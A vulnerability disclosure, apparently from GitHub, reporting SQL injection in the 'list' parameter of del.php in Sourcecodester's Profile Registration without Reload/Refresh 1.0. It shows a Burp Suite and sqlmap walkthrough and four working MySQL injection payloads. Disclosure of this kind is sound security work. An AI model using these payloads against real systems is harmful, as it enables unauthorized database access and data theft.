# SQL Injection vulnerability was discovered from Sourcecodester Profile Registration without Reload/Refresh 1.0 (del.php)

**Affected Project**: Profile Registration without Reload/Refresh 1.0

**Official Website**: https://www.sourcecodester.com/php/17587/profile-registration-without-reloadrefresh-using-ajax-php-and-mysql-source-code.html

**Version**: 1.0

**Related Code file**: del.php

**Injection parameter**: GET parameter 'list' is vulnerable.

## Demonstration

Below is Profile Registration without Reload/Refresh 1.0:

![index](https://github.com/user-attachments/assets/7475fe84-3943-4b50-9929-625bc27582cf)

Below is admin page. We can see there is a delete feature to it:

![admin-php](https://github.com/user-attachments/assets/babd4ca6-685a-4f73-9554-5fe801da89f9)

Let's try deleting one of the entry:

![Screenshot from 2024-09-22 15-17-22](https://github.com/user-attachments/assets/b61c28b2-27dd-4e83-8fd8-a8d00c4eadab)


We will intercept the delete (del.php) traffic using Burp Suite:

![Screenshot from 2024-09-22 15-18-26](https://github.com/user-attachments/assets/19d5ceec-899b-47d9-a123-126a1796db19)

After saving the intercepted request as txt file, we will run sqlmap against it: `sqlmap -r del.req --batch`

![image](https://github.com/user-attachments/assets/1ea8910d-7617-4454-9925-3c0b443e4328)

sqlmap identifies GET parameter 'list' as vulnerable. Below is the payload used:

---
Parameter: list (GET)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: list=1' AND EXTRACTVALUE(6463,CASE WHEN (6463=6463) THEN 6463 ELSE 0x3A END)-- jUPW

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: list=1' AND GTID_SUBSET(CONCAT(0x7176786271,(SELECT (ELT(3483=3483,1))),0x71627a6271),3483)-- xwxz

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: list=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: list=1' AND (SELECT 7323 FROM (SELECT(SLEEP(5)))ELsa)-- jKqa
---


